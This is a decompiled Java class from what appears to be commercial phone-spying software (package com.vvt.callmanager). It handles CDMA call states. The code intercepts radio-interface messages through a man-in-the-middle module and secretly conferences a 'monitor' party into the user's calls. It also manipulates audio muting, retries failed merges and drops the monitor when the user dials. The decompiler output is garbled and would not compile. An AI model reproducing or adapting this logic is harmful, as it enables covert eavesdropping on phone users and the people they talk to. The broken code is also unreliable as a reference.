package com.vvt.callmanager.filter;

import android.media.AudioManager;
import android.os.Parcel;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.mitm.a;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.callmanager.ref.MonitorDisconnectData.Reason;
import java.util.ArrayList;

 enum FilterCdmaCall$CallState$6
{
  byte[] cacheMessage;
  int mergingCount;
  boolean waitForFlashDialResponse;
  boolean waitForFlashDropLastCallResponse;
  boolean waitForFlashMergeResponse;
  
  FilterCdmaCall$CallState$6()
  {
    super(paramString, paramInt, null);
  }
  
  private void a(int paramInt)
  {
    e locale = new com/vvt/callmanager/filter/e;
    locale.<init>(this, paramInt);
    locale.start();
  }
  
  private boolean a(Parcel paramParcel)
  {
    paramParcel.setDataPosition(12);
    int i = paramParcel.readInt();
    if (i == 0) {}
    int j;
    for (i = 1;; j = 0) {
      return i;
    }
  }
  
  public void onEnter(Object paramObject)
  {
    BugEngineCallState localBugEngineCallState = null;
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    this.waitForFlashDialResponse = true;
    this.waitForFlashMergeResponse = false;
    this.waitForFlashDropLastCallResponse = false;
    this.cacheMessage = null;
    this.mergingCount = 0;
    FilterCdmaCall localFilterCdmaCall = this.mFilterCall;
    localBugEngineCallState = BugEngineCallState.CDMA_AUTO_CONFERENCING;
    FilterCdmaCall.a(localFilterCdmaCall, localBugEngineCallState);
  }
  
  public Object onExit()
  {
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    return null;
  }
  
  public FilterCdmaCall.CallState processResponse(Parcel paramParcel)
  {
    int i = 84;
    int j = 1;
    int k = 0;
    FilterCdmaCall localFilterCdmaCall = null;
    Object localObject1 = FilterCdmaCall.a(this.mFilterCall);
    int m = ((m)localObject1).c(paramParcel);
    int i1 = 53;
    Object localObject2;
    if (m == i1)
    {
      localObject1 = l.a(paramParcel);
      m = ((l)localObject1).b;
      i1 = 117901063;
      if (m != i1)
      {
        k = j;
        localObject2 = this;
      }
    }
    for (;;)
    {
      if (k != 0)
      {
        localFilterCdmaCall = this.mFilterCall;
        localFilterCdmaCall.c(paramParcel);
      }
      return (FilterCdmaCall.CallState)localObject2;
      j = 0;
      localObject2 = null;
      break;
      boolean bool2 = this.waitForFlashDialResponse;
      if ((bool2) && (m == i))
      {
        this.waitForFlashDialResponse = false;
        j = 13;
        a(j);
        localObject2 = this;
      }
      else
      {
        bool2 = this.waitForFlashMergeResponse;
        int n;
        Object localObject3;
        if ((bool2) && (m == i))
        {
          boolean bool1 = a(paramParcel);
          if (bool1)
          {
            this.waitForFlashMergeResponse = false;
            FilterCdmaCall.a(this.mFilterCall, "Mute OFF");
            localObject2 = this.mFilterCall;
            localObject1 = FilterCdmaCall.a(this.mFilterCall);
            i.a(false, (n)localObject2, (m)localObject1);
            FilterCdmaCall.c(this.mFilterCall).setMode(0);
            localObject2 = FilterCdmaCall.c(this.mFilterCall);
            n = 2;
            ((AudioManager)localObject2).setMode(n);
            localObject2 = FilterCdmaCall.c(this.mFilterCall);
            ((AudioManager)localObject2).setStreamMute(0, false);
          }
          for (;;)
          {
            localObject2 = this;
            break;
            n = this.mergingCount;
            int i2 = 5;
            if (n < i2)
            {
              n = this.mergingCount + 1;
              this.mergingCount = n;
              localObject1 = this.mFilterCall;
              localObject3 = "Merging failed, count: %d";
              localObject2 = new Object[j];
              i = this.mergingCount;
              Integer localInteger = Integer.valueOf(i);
              localObject2[0] = localInteger;
              localObject2 = String.format((String)localObject3, (Object[])localObject2);
              FilterCdmaCall.a((FilterCdmaCall)localObject1, (String)localObject2);
              localObject2 = new com/vvt/callmanager/filter/d;
              ((d)localObject2).<init>(this);
              localObject1 = new java/lang/Thread;
              ((Thread)localObject1).<init>((Runnable)localObject2);
              ((Thread)localObject1).start();
            }
            else
            {
              FilterCdmaCall.a(this.mFilterCall, "Stop continue merging -> Hangup");
              localObject2 = this.mFilterCall;
              localObject1 = FilterCdmaCall.a(this.mFilterCall);
              i.b((n)localObject2, (m)localObject1);
            }
          }
        }
        boolean bool3 = this.waitForFlashDropLastCallResponse;
        if ((bool3) && (n == i))
        {
          this.waitForFlashDropLastCallResponse = false;
          localObject2 = this.cacheMessage;
          if (localObject2 != null)
          {
            localObject2 = this.mFilterCall;
            localObject1 = i.a(this.cacheMessage);
            ((FilterCdmaCall)localObject2).d((Parcel)localObject1);
            localObject2 = MULTIPLE_CALLS;
          }
        }
        else
        {
          int i3 = 1001;
          if (n == i3)
          {
            localObject2 = FilterCdmaCall.a(this.mFilterCall);
            localObject1 = this.mFilterCall;
            i.a((m)localObject2, (n)localObject1);
            localObject2 = this;
            continue;
          }
          i3 = 9;
          if (n != i3) {
            break label594;
          }
          localObject2 = com.vvt.callmanager.a.d.a(paramParcel);
          localObject1 = "FilterCall";
          localObject3 = FilterCdmaCall.a(this.mFilterCall).a();
          i.a((String)localObject1, (ArrayList)localObject2, (a)localObject3);
          j = ((ArrayList)localObject2).size();
          if (j == 0)
          {
            FilterCdmaCall.a(this.mFilterCall, "3rd Party and monitor is gone");
            localObject2 = IDLE;
            localObject1 = this.mFilterCall;
            localObject3 = i.a(i.n);
            ((FilterCdmaCall)localObject1).c((Parcel)localObject3);
            continue;
          }
        }
        localObject2 = this;
        continue;
        label594:
        k = j;
        localObject2 = this;
      }
    }
  }
  
  public FilterCdmaCall.CallState processRilRequest(Parcel paramParcel)
  {
    boolean bool = true;
    Object localObject1 = FilterCdmaCall.a(this.mFilterCall);
    int i = ((m)localObject1).b(paramParcel);
    int j = 84;
    FilterCdmaCall localFilterCdmaCall;
    if (i == j)
    {
      FilterCdmaCall.a(this.mFilterCall, "Cache Flash message -> Drop Monitor");
      localObject1 = paramParcel.marshall();
      this.cacheMessage = ((byte[])localObject1);
      localObject1 = this.mFilterCall;
      Object localObject2 = FilterCdmaCall.a(this.mFilterCall);
      i.a((n)localObject1, (m)localObject2);
      this.waitForFlashDropLastCallResponse = bool;
      bool = false;
      localFilterCdmaCall = null;
      localObject1 = this.mFilterCall;
      localObject2 = new com/vvt/callmanager/ref/MonitorDisconnectData;
      String str = FilterCdmaCall.f(this.mFilterCall);
      MonitorDisconnectData.Reason localReason = MonitorDisconnectData.Reason.DIALING;
      ((MonitorDisconnectData)localObject2).<init>(str, localReason);
      FilterCdmaCall.a((FilterCdmaCall)localObject1, (MonitorDisconnectData)localObject2);
    }
    if (bool)
    {
      localFilterCdmaCall = this.mFilterCall;
      localFilterCdmaCall.d(paramParcel);
    }
    return this;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterCdmaCall$CallState$6.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */